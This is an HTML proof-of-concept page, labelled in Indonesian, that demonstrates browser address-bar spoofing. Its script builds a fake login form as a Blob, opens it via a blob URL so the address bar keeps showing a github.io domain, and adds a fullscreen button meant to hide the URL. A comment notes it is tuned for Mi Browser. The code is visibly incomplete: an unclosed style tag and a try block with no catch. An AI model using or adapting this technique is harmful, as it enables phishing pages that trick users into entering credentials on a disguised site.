<!DOCTYPE html>
<html>
<head>

<style>
 body{background:white!important;color:black!important;font-family:sans-serif;padding:20px}

<body>
<h3>PoC COMBO - Blob + Fullscreen Spoof</h3>
<button id="btn">KLIK UNTUK SERANGAN COMBO</button>
<div id="log">Status: Siap - Klik tombol di atas</div>

<script>
document.getElementById('btn').onclick = function(){
  const log = document.getElementById('log');
  try{
    const fake = `
      <body style="background:white;color:black;font-family:sans-serif;padding:20px">
      <h2 style="color:red">LOGIN TIMEOUT - bonex1927.github.io</h2>
      <p>Address bar masih <b>bonex1927.github.io</b> padahal ini dari BLOB</p>
      <input placeholder="Email" style="width:100%;padding:12px"><br><br>
      <input type="password" placeholder="Password" style="width:100%;padding:12px"><br><br>
      <button style="width:100%;padding:12px;background:blue;color:white">LOGIN PALSU</button>
      <hr>
      <button onclick="document.documentElement.requestFullscreen()" style="width:100%;padding:15px;background:black;color:white;margin-top:20px">FULLSCREEN HIDE URL</button>
      </body>
    `;
    log.textContent = "Membuat blob...";
    const blob = new Blob([fake], {type:'text/html'});
    const url = URL.createObjectURL(blob);
    log.textContent += "\nURL: " + url + "\nMembuka...";

    // FIX buat Mi Browser - pakai window.open + location biar gak ke-block
    setTimeout(()=>{ window.location.href = url; }, 100);

};
</script>
